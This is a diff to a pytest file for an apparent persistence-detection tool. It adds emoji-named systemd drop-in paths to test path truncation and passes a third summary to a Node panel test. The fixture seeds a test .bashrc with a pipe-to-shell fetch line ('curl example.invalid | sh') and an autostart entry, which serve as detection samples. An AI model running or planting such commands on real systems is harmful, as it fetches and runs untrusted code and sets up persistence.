@@ -26,16 +26,23 @@ def summaries(tmp_path):
     review.now = lambda: '2026-10-18T06:30:00Z'
     (home/'.bashrc').write_text('curl example.invalid | sh\n')
     (home/'.config/autostart/new.desktop').write_text('[Desktop Entry]\nExec=/tmp/new\n')
-    return fresh, persistence_review.summary(review.review())
+    changed = persistence_review.summary(review.review())
+    # A genuine drop-in path of emoji: few code points, many UTF-16 units and escaped bytes.
+    drop_in = home/'.config/systemd/user'/('\U0001F600' * 62 + '.d')
+    drop_in.mkdir(parents=True)
+    (drop_in/('\U0001F680' * 62 + '.conf')).write_text('[Service]\n')
+    wide = persistence_review.summary(review.review())
+    assert any('\U0001F600' in f['path'] and f['path'].endswith('...') for f in wide['findings'])
+    return fresh, changed, wide
 
 
 def test_persistence_panel_renders_real_summaries_and_rejects_forged_payloads(tmp_path):
     if not shutil.which('node'):
         pytest.skip('Node unavailable')
-    fresh, changed = summaries(tmp_path)
+    fresh, changed, wide = summaries(tmp_path)
     assert {f['rule'] for f in changed['findings']} >= {'ADDED', 'CHANGED'} and changed['baseline_at']
     result = subprocess.run([shutil.which('node'), str(Path(__file__).with_name('persistence_browser.cjs'))],
-                            input=json.dumps(dict(code=PERSISTENCE_JS, fresh=fresh, changed=changed)),
+                            input=json.dumps(dict(code=PERSISTENCE_JS, fresh=fresh, changed=changed, wide=wide)),
                             text=True, capture_output=True, timeout=10)
     assert result.returncode == 0, result.stderr
 
